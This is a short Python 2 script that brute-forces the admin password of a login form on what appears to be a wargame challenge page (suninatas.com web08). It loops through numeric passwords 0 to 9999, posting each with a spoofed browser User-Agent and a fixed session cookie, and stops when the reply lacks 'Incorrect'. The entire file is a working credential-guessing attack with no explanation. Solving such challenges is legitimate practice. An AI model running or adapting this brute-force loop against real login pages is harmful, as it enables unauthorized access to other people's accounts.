import urllib2
import sys
import time

url = "http://suninatas.com/Part_one/web08/web08.asp"

for i in range(10000):
	opener = urllib2.build_opener(urllib2.HTTPHandler)
	request = urllib2.Request(url, data = "id=admin&pw="+str(i))
	request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
	request.add_header('Cookie', 'ASPSESSIONIDQSCSBBRT=ILIHJDADLBIDDOPOEHNPKHJB;')
	request.get_method = lambda:'POST'
	data = opener.open(request)
	response = data.read()	
	print "[*] Request id=admin&pw="+str(i)
	if "Incorrect" not in response:
		print "[*] Find it!! password is "+str(i)
		break
